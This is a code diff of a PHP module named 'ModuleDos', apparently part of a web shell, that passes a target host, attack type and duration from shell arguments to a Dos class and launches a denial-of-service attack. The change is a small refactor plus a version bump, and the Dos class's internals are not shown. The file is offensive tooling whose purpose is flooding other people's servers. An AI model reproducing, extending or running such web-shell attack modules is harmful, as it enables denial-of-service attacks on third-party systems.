@@ -550,7 +550,7 @@ class ModuleDos implements ShellInterface
 		/**
 		 * Wersja Data Autor
 		 */
-		return '1.01 2011-06-18 - <krzotr@gmail.com>';
+		return '1.02 2011-10-19 - <krzotr@gmail.com>';
 	}
 
 	/**
@@ -609,25 +609,26 @@ DATA;
 			return $this -> getHelp();
 		}
 
+		header( 'Content-Type: text/plain; charset=utf-8' );
+
 		try
 		{
 			ob_start();
 
-			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
+			$oDos = new Dos();
+			$oDos
+				-> setHost( $this -> oShell -> aArgv[1] )
+				-> setType( $this -> oShell -> aArgv[0] )
+				-> setTime( $this -> oShell -> aArgv[2] )
+				-> setNewConnection( in_array( 'n', $this -> oShell -> aOptv ) )
+				-> get();
 
-			$oPasswordRecovery = new Dos();
-			$oPasswordRecovery -> setHost( $this -> oShell -> aArgv[1] )
-					   -> setType( $this -> oShell -> aArgv[0] )
-					   -> setTime( $this -> oShell -> aArgv[2] )
-					   -> setNewConnection( in_array( 'n', $this -> oShell -> aOptv ) )
-					   -> get();
 			ob_end_flush();
 			exit ;
 
 		}
 		catch( DosException $oException )
 		{
-			header( 'Content-Type: text/html; charset=utf-8', TRUE );
 			return $oException -> getMessage();
 		}
 	}
